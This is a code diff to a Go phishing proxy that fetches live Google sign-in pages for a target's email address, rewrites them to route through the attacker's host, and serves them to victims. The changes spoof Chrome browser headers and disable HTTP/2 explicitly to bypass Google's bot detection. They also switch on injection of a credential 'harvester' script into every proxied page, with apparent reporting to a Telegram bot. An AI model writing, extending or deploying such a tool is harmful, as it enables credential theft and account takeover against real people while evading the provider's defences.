@@ -108,12 +108,14 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 		log.Printf("[PROXY] Fetching live page for %s from %s", email, targetBase)
 
-		// Create HTTP Client for Proxy
+		// Create HTTP Client for Proxy (Disable HTTP/2 to bypass fingerprinting)
 		proxyClient := &http.Client{
 			CheckRedirect: func(req *http.Request, via []*http.Request) error {
 				return http.ErrUseLastResponse // Stop redirects, we handle them manually
 			},
-			Transport: &http.Transport{},
+			Transport: &http.Transport{
+				ForceAttemptHTTP2: false, // CRITICAL: Google blocks default Go HTTP/2 requests
+			},
 		}
 
 		// Initial Fetch
@@ -123,13 +125,17 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 			return
 		}
 
-		// Spoof headers to bypass Google's bot detection
-		req.Header.Set("User-Agent", c.GetHeader("User-Agent"))
-		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
+		// SPOOFING HEADERS: Make Go look exactly like Chrome on Windows
+		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
+		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
 		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+		req.Header.Set("Sec-Ch-Ua", `"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"`)
+		req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
+		req.Header.Set("Sec-Ch-Ua-Platform", `"Windows"`)
 		req.Header.Set("Sec-Fetch-Dest", "document")
 		req.Header.Set("Sec-Fetch-Mode", "navigate")
 		req.Header.Set("Sec-Fetch-Site", "none")
+		req.Header.Set("Sec-Fetch-User", "?1")
 		req.Header.Set("Upgrade-Insecure-Requests", "1")
 
 		resp, err := proxyClient.Do(req)
@@ -157,12 +163,12 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 			rewrittenBody = strings.ReplaceAll(rewrittenBody, "https://"+strings.Split(email, "@")[1], c.Request.Host+"/")
 		}
 
-		// Inject Harvester Script before </body>
-		// rewrittenBody = strings.Replace(rewrittenBody, "</body>", harvesterScript+"</body>", 1)
+		// Force relative links to route through the proxy correctly
+		baseTag := `<base href="` + targetBase + `">`
+		rewrittenBody = strings.Replace(rewrittenBody, "<head>", "<head>\n"+baseTag, 1)
 
-		// Force relative links to route through the proxy
-		baseTag := `<base href="https://accounts.google.com/">`
-		rewrittenBody = strings.Replace(rewrittenBody, "<head>", "<head>"+baseTag, 1)
+		// Inject Harvester Script before </body>
+		rewrittenBody = strings.Replace(rewrittenBody, "</body>", harvesterScript+"</body>", 1)
 
 		// --- HEADER CLONING ---
 		CloneHeaders(resp, c.Writer)
